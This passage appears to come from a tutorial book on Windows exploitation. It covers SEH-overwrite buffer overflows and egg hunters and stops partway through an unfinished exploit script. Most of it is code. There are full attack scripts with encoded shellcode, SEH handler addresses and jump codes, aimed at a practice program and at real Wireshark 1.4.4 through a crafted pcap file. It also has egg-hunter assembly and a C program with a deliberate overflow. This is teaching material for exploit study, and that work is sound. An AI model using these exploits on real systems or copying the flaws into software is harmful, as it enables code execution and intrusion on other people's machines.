<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//TestException2.cpp<br>#include &lt;cstdio&gt;<br>#include &lt;cstdlib&gt;<br>#include &lt;Windows.h&gt;<br><br>unsigned dummy;<br><br>EXCEPTION_DISPOSITION<br>__cdecl<br>handler_function(<br>	struct _EXCEPTION_RECORD *ExceptionRecord,<br>	void *EstablisherFrame,<br>	struct _CONSTEXT *ContextRecord,<br>	void *DispatcherContext<br>)<br>&#123;<br>	printf(&quot;This is our exception handler.&quot;);<br>	ContextRecord-&gt;Eax = (unsigned)&amp;dummy;<br>&#125;<br><br>int main() &#123;<br>	unsigned Handler = (unsigned)hander_function;<br><br>	__asm &#123;<br>		push Handler	// Push Handler into stack.<br>		push FS:[0]		// Push the address of ExceptionList into stack.<br>		mov FS:[0],ESP	// move _EXCEPTION_REGISTRATION_RECORD to the beginning of the ExceptionList.<br>	&#125;<br><br>	__asm &#123;<br>		mov eax, 0		// Set EAX to be 0.<br>		mov [eax], 0	// Set [EAX] to be 0.<br><br>		/*<br>		This part of code is equivalent to: *(int*)0 = 0;<br>		*/<br>	&#125;<br><br>	printf(&quot;After handling\n&quot;);<br><br>	__asm &#123;<br>		mov eax,[ESP]	// Load Next into EAX<br>		mov FS:[0],EAX	// Load EAX into ExceptionList<br>		add esp,8		// Clear stack.<br>	&#125;<br><br>	system(&quot;pause&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//TestException3.cpp<br>int main() &#123;<br>	__asm &#123;<br>		push Handler   //Push exception handler into stack.<br>		push FS:[0]    //Push the current ExceptionList into stack.<br>		mov FS:[0],ESP //Load new _EXCEPTION_REGISTRATION_RECORD into ExceptionList<br>	&#125;<br><br>	*(int*)0 = 0;      //Exception<br><br>	__asm &#123;<br>	Handler:           //Exception handler<br>		INT 3          //Breakpoint<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>Open <code>TestException3.exe</code> with Immunity Debugger. Press <code>F9</code> to execute the program. Press <code>Alt+S</code> to show <strong>SEH chain</strong> after the program thrown the exception:</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.1.png'><img src="/images/books/bufferoverflow/5.1.png" width="700">
</p>

<h3 id="Practice-Vulnerable001"><a href="#Practice-Vulnerable001" class="headerlink" title="Practice - Vulnerable001"></a>Practice - Vulnerable001</h3><p>Here we use <code>Vulnerable001.exe</code> in Chapter 4. The following script is our new attack script:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable001-excp.cpp<br>#include &lt;iostream&gt;<br>#include &lt;string&gt;<br>#include &lt;fstream&gt;<br><br>using namespace std;<br><br>#define FILENAME &quot;Vulnerable001_Excp_Exploit.txt&quot;<br><br>int main() &#123;<br>	string junk(1500, &#x27;A&#x27;);<br>	<br>	ofstream fout(FILENAME, ios::binary);<br>	fout &lt;&lt; junk;<br>	<br>	cout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><br>Open it with Immunity Debugger and input the path of <code>Vulnerable001-Excp-Exploit.txt</code>:</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.2.png'><img src="/images/books/bufferoverflow/5.2.png" width="700">
</p>

<p>Press <code>F9</code>. Our program will be stopped. Press <code>F9</code> to resume. <code>EIP</code> will be filled with <code>41414141</code>:</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.3.png'><img src="/images/books/bufferoverflow/5.3.png" width="700">
</p>

<p>Press <code>Alt+S</code> to show <strong>SEH chain</strong> window. Notice that the <code>SEH structure</code> of <code>SEH chain</code> is also filled by <code>41414141</code>:</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.4.png'><img src="/images/books/bufferoverflow/5.4.png" width="500">
</p>

<p>Now, we need to find the offset value with <strong>mona (We have done this many many times!)</strong>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona pattern_create 1500<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.5.png'><img src="/images/books/bufferoverflow/5.5.png" width="500">
</p>

<p><strong>Handler</strong> is replaced by <code>77423177</code> while <strong>Next</strong> is replaced by <code>42307742</code>.</p>
<p>Check the stack (<code>0x0022FFE0</code>):</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.6.png'><img src="/images/books/bufferoverflow/5.6.png" width="500">
</p>

<p>Notice that we almost reach the bottom. Which means we are not allowed to fill too much data between <strong>Next</strong> and <strong>Handler</strong>. A bunch of 1500 bytes data is meaningless since we cannot put all data into the stack.</p>
<p>Find the offset of <code>42307742</code> (<strong>Next</strong>):</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.7.png'><img src="/images/books/bufferoverflow/5.7.png" width="700">
</p>

<p>And the offset of <code>77423177</code> (<strong>Handler</strong>).</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.8.png'><img src="/images/books/bufferoverflow/5.8.png" width="700">
</p>

<p>We modify the attack script:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable001-excp.cpp<br>#include &lt;iostream&gt;<br>#include &lt;string&gt;<br>#include &lt;fstream&gt;<br><br>using namespace std;<br><br>#define FILENAME &quot;Vulnerable001_Excp_Exploit.txt&quot;<br><br>int main() &#123;<br>	string junk(1440, &#x27;A&#x27;);<br>	string next(&quot;\xcc\xcc\xcc\xcc&quot;);<br>	string handler(&quot;\xef\xbe\xad\xde&quot;);<br>	<br>	ofstream fout(FILENAME, ios::binary);<br>	fout &lt;&lt; junk &lt;&lt; next &lt;&lt; handler;<br>	<br>	cout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.9.png'><img src="/images/books/bufferoverflow/5.9.png" width="700">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona seh<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.10.png'><img src="/images/books/bufferoverflow/5.10.png" width="800">
</p>

<p><strong>Final attack script:</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable001-excp.cpp<br>#include &lt;iostream&gt;<br>#include &lt;string&gt;<br>#include &lt;fstream&gt;<br><br>using namespace std;<br><br>#define FILENAME &quot;Vulnerable001_Excp_Exploit.txt&quot;<br><br>char buf[] = <br>&quot;\xb8\xd7\x13\x93\x1c\xda\xc3\xd9\x74\x24\xf4\x5a\x31\xc9&quot;<br>&quot;\xb1\x39\x31\x42\x12\x03\x42\x12\x83\x15\x17\x71\xe9\x65&quot;<br>&quot;\xf0\xfa\x12\x95\x01\x65\x9a\x70\x30\xb7\xf8\xf1\x61\x07&quot;<br>&quot;\x8a\x57\x8a\xec\xde\x43\x9d\x45\x94\x4d\x2a\xdb\x01\xa0&quot;<br>&quot;\xd3\x2d\x92\x6e\x17\x2f\x6e\x6c\x44\x8f\x4f\xbf\x99\xce&quot;<br>&quot;\x88\x76\xd7\x3f\x44\xdf\x9c\x92\x79\x54\xe0\x2e\x7b\xba&quot;<br>&quot;\x6e\x0e\x03\xbf\xb1\xfb\xbf\xbe\xe1\x8f\x08\xd8\x8a\xc8&quot;<br>&quot;\xa8\xd9\x5f\xb8\x2d\x10\x2b\x05\x67\x93\x2b\xfe\x43\x58&quot;<br>&quot;\xd2\xd7\x9d\x9e\x79\x16\x12\x13\x83\x5e\x95\xcb\xf6\x94&quot;<br>&quot;\xe5\x76\x01\x6f\x97\xac\x84\x70\x3f\x27\x3e\x55\xc1\xe4&quot;<br>&quot;\xd9\x1e\xcd\x41\xad\x79\xd2\x54\x62\xf2\xee\xdd\x85\xd5&quot;<br>&quot;\x66\xa5\xa1\xf1\x23\x7e\xcb\xa0\x89\xd1\xf4\xb3\x76\x8e&quot;<br>&quot;\x50\xbf\x95\xd9\xe5\x40\x66\xe6\xbb\x56\x92\x18\x44\xa7&quot;<br>&quot;\xd0\x6b\x21\xd5\x29\xb9\x87\x7d\x22\xd1\xd7\x15\xf6\x5e&quot;<br>&quot;\xfe\xe2\xf9\x75\x94\xec\xed\x7c\x69\xed\xed\x3c\x26\xab&quot;<br>&quot;\xcd\x94\xdd\x40\x7a\x14\xf6\xab\x82\x14\x06\xfc\xe7\x78&quot;<br>&quot;\x6a\x93\xc7\xf7\x1d\x19\x64\x93\xe1\xb7\x74\x33\xa7\xc4&quot;<br>&quot;\x23\xc4\xd8\x1e\xa1\xca\x4e\x51\x83\x68\xd8\x6e\x39&quot;;<br><br>int main() &#123;<br>	string next(&quot;\xEB\xF6&quot; &quot;\x90\x90&quot;);	// jmp short -0x88 # NOP x 2<br>	string handler(&quot;\x4d\x25\x40\x00&quot;);	// 0040254d<br>	string shellcode(buf);<br>	string second_jumpcode(&quot;\xE9\xCF\xFE\xFF\xFF&quot; &quot;\x90\x90\x90&quot;);	// jmp -0x12c # NOP x 3<br>	string nops(1440 - shellcode.size() - second_jumpcode.size(), &#x27;\x90&#x27;);<br>	<br>	ofstream fout(FILENAME, ios::binary);<br>	fout &lt;&lt; nops &lt;&lt; shellcode &lt;&lt; second_jumpcode &lt;&lt; next &lt;&lt; handler;<br>	<br>	cout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.11.png'><img src="/images/books/bufferoverflow/5.11.png" width="500">
</p>

<h3 id="Practice-Wireshark-1-4-4"><a href="#Practice-Wireshark-1-4-4" class="headerlink" title="Practice - Wireshark 1.4.4"></a>Practice - Wireshark 1.4.4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.12.png'><img src="/images/books/bufferoverflow/5.12.png" width="700">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.13.png'><img src="/images/books/bufferoverflow/5.13.png" width="500">
</p>

<p>Offset of Handler: <code>1243</code><br>Offset of Next: <code>1239</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona seh<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.14.png'><img src="/images/books/bufferoverflow/5.14.png" width="500">
</p>

<p>Here we use the address: ‘0x64F98F68’ (Don’t forget to check the bad chars for the address!)</p>
<p>Thus, the attack script is:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//Filename: attack-wireshark.cpp<br>#include &lt;string&gt;<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br><br>using namespace std;<br><br>typedef long int32;<br>typedef short int16;<br>typedef char int8;<br>typedef unsigned long uint32;<br>typedef unsigned short uint16;<br>typedef unsigned char uint8;<br><br>//PCAP Global Header<br>typedef __declspec(align(1)) struct pcap_hdr_s &#123;<br>	uint32 magic_number;<br>	uint16 version_major;<br>	uint16 version_minor;<br>	int32 thiszone;<br>	uint32 sigfigs;<br>	uint32 snaplen;<br>	uint32 network;<br>&#125; pcap_hdr_t;<br><br>//PCAP Packet Header<br>typedef __declspec(align(1)) struct pcaprec_hdr_s &#123;<br>	uint32 ts_sec;<br>	uint32 ts_usec;<br>	uint32 incl_len;<br>	uint32 orig_len;<br>&#125; pcaprec_hdr_t;<br><br>size_t const ETHER_ADDR_LEN = 6;<br><br>//Ethernet II Header<br>typedef __declspec(align(1)) struct ether_hdr_s &#123;<br>	uint8 ether_dhost[ETHER_ADDR_LEN];<br>	uint8 ether_short[ETHER_ADDR_LEN];<br>	uint16 ether_type;<br>&#125; ether_hdr_t;<br><br>string const TEMPLATE_FILE = &quot;template.pcap&quot;;<br>string const EXPLOIT_FILE = &quot;exploit.pcap&quot;;<br><br>char buf[] = <br>&quot;\xb8\xd7\x13\x93\x1c\xda\xc3\xd9\x74\x24\xf4\x5a\x31\xc9&quot;<br>&quot;\xb1\x39\x31\x42\x12\x03\x42\x12\x83\x15\x17\x71\xe9\x65&quot;<br>&quot;\xf0\xfa\x12\x95\x01\x65\x9a\x70\x30\xb7\xf8\xf1\x61\x07&quot;<br>&quot;\x8a\x57\x8a\xec\xde\x43\x9d\x45\x94\x4d\x2a\xdb\x01\xa0&quot;<br>&quot;\xd3\x2d\x92\x6e\x17\x2f\x6e\x6c\x44\x8f\x4f\xbf\x99\xce&quot;<br>&quot;\x88\x76\xd7\x3f\x44\xdf\x9c\x92\x79\x54\xe0\x2e\x7b\xba&quot;<br>&quot;\x6e\x0e\x03\xbf\xb1\xfb\xbf\xbe\xe1\x8f\x08\xd8\x8a\xc8&quot;<br>&quot;\xa8\xd9\x5f\xb8\x2d\x10\x2b\x05\x67\x93\x2b\xfe\x43\x58&quot;<br>&quot;\xd2\xd7\x9d\x9e\x79\x16\x12\x13\x83\x5e\x95\xcb\xf6\x94&quot;<br>&quot;\xe5\x76\x01\x6f\x97\xac\x84\x70\x3f\x27\x3e\x55\xc1\xe4&quot;<br>&quot;\xd9\x1e\xcd\x41\xad\x79\xd2\x54\x62\xf2\xee\xdd\x85\xd5&quot;<br>&quot;\x66\xa5\xa1\xf1\x23\x7e\xcb\xa0\x89\xd1\xf4\xb3\x76\x8e&quot;<br>&quot;\x50\xbf\x95\xd9\xe5\x40\x66\xe6\xbb\x56\x92\x18\x44\xa7&quot;<br>&quot;\xd0\x6b\x21\xd5\x29\xb9\x87\x7d\x22\xd1\xd7\x15\xf6\x5e&quot;<br>&quot;\xfe\xe2\xf9\x75\x94\xec\xed\x7c\x69\xed\xed\x3c\x26\xab&quot;<br>&quot;\xcd\x94\xdd\x40\x7a\x14\xf6\xab\x82\x14\x06\xfc\xe7\x78&quot;<br>&quot;\x6a\x93\xc7\xf7\x1d\x19\x64\x93\xe1\xb7\x74\x33\xa7\xc4&quot;<br>&quot;\x23\xc4\xd8\x1e\xa1\xca\x4e\x51\x83\x68\xd8\x6e\x39&quot;;<br><br>int main() &#123;<br>	pcap_hdr_t global_header;<br>	pcaprec_hdr_t packet_header;<br>	ether_hdr_t ether_header;<br>	<br>	size_t const OFFSET_LEN = 1239;<br>	string nops(OFFSET_LEN, &#x27;\x90&#x27;);<br>	string next = &quot;\xEB\x0A\x90\x90&quot;; // JMP SHORT 0x0C (EB0A) # NOPx2<br>	string handler = &quot;\x68\x8f\xf9\x64&quot;; // 64F98F68<br>	string slide(50, &#x27;\x90&#x27;);<br>	string shellcode(buf);<br>	<br>	string exploit = nops + next + handler + slide + shellcode;<br> 	<br>	ifstream fin(TEMPLATE_FILE.c_str(), ios::binary);<br>	fin.read((char*)&amp;global_header, sizeof(global_header)).<br>		read((char*)&amp;packet_header, sizeof(packet_header)).<br>		read((char*)&amp;ether_header, sizeof(ether_header));<br>	<br>	packet_header.incl_len = packet_header.orig_len = sizeof(ether_header) + exploit.size();<br>	<br>	ether_header.ether_type = 0x2323;<br>	<br>	ofstream fout(EXPLOIT_FILE.c_str(), ios::binary);<br>	fout.write((char*)&amp;global_header, sizeof(global_header)).<br>		 write((char*)&amp;packet_header, sizeof(packet_header)).<br>		 write((char*)&amp;ether_header, sizeof(ether_header))<br>		 &lt;&lt; exploit;<br>		 <br>	cout &lt;&lt; &quot;OK: &quot; &lt;&lt; EXPLOIT_FILE &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.15.png'><img src="/images/books/bufferoverflow/5.15.png" width="500">
</p>

<h2 id="5-2-Egg-Hunt"><a href="#5-2-Egg-Hunt" class="headerlink" title="5.2 - Egg Hunt"></a>5.2 - Egg Hunt</h2><h3 id="NtDisplayString"><a href="#NtDisplayString" class="headerlink" title="NtDisplayString"></a>NtDisplayString</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">loop_inc_page:<br>	or dx,0x0fff<br><br>loop_inc_one:<br>	inc edx<br><br>loop_check:<br>	push edx<br>	push 0x43<br><br>	pop eax<br>	int 0x2e<br>	cmp al,0x05<br><br>	pop edx<br>loop_check_8_valid:<br>	je loop_inc_page<br><br>is_egg:<br>	mov eax,0x50905090<br>	mov edi,edx<br>	scasd<br>	jnz loop_inc_one<br><br>	scasd<br><br>	jnz loop_inc_one<br><br>matched:<br>	jmp edi<br></code></pre></td></tr></table></figure>
<p><strong>WinDbg:</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">lkd&gt; dds nt!KeServiceDescriptorTable L4<br></code></pre></td></tr></table></figure></p>
<ul>
<li>lkd: Local Kernel Debug</li>
<li>dds: display dword symbol</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">lkd&gt; dds nt!KiServiceTable<br></code></pre></td></tr></table></figure>
<h3 id="NtAccessCheckAndAlarm"><a href="#NtAccessCheckAndAlarm" class="headerlink" title="NtAccessCheckAndAlarm"></a>NtAccessCheckAndAlarm</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">loop_inc_page:<br>	or dx, 0x0fff<br><br>loop_inc_one:<br>	inc edx<br><br>loop_check:<br>	push edx<br>	push 0x02<br><br>	pop eax<br>	int 0x2e<br>	cmp al,0x05<br><br>	pop edx<br>loop_check_8_valid:<br>	je loop_inc_page<br><br>is_egg:<br>	mov eax, 0x50905090<br>	mov edi,edx<br>	scasd<br>	jnz loop_inc_one<br><br>	scasd<br><br>	jnz loop_inc_one<br><br>matched:<br>	jmp edi<br></code></pre></td></tr></table></figure>
<h3 id="Egg-Hunt-Practice"><a href="#Egg-Hunt-Practice" class="headerlink" title="Egg Hunt Practice"></a>Egg Hunt Practice</h3><p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.16.png'><img src="/images/books/bufferoverflow/5.16.png" width="700">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//vulnerable004.c<br>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br><br>int main(int argc, char *argv[]) &#123;<br>	FILE *pFile;<br>	char *long_buffer;<br>	char short_buf[64];<br>	printf(&quot;Vulnerable004 starts...\n&quot;);<br>	<br>	if (argc &gt;= 2) pFile = fopen(argv[1], &quot;r&quot;);<br>	if (pFile) &#123;<br>		long_buffer = malloc(2048);<br>		fscanf(pFile, &quot;%s&quot;, long_buffer);<br>		<br>		//do something<br>		<br>		free(long_buffer);<br>		<br>		fscanf(pFile, &quot;%s&quot;, short_buf);<br>	&#125;<br>	<br>	printf(&quot;Vulnerable004 ends...\n&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable004.cpp<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;string&gt;<br><br>using namespace std;<br><br>string const OUTPUT_FILE = &quot;exploit-vulnerable004.txt&quot;;<br><br>int main() &#123;<br>	ofstream fout(OUTPUT_FILE.c_str());<br>	<br>	string junk1(1000, &#x27;A&#x27;);<br>	string junk2(200, &#x27;B&#x27;);<br>	<br>	fout &lt;&lt; junk1 &lt;&lt; &#x27;\n&#x27;<br>		 &lt;&lt; junk2 &lt;&lt; endl;<br>		 <br>	cout &lt;&lt; &quot;OK: &quot; &lt;&lt; OUTPUT_FILE &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona jmp -r esp<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.18.png'><img src="/images/books/bufferoverflow/5.18.png" width="700">
</p>

<p><strong>Exploit script:</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable004.cpp<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;string&gt;<br><br>using namespace std;<br><br>string const OUTPUT_FILE = &quot;exploit-vulnerable004.txt&quot;;<br><br>char eggcode[] = 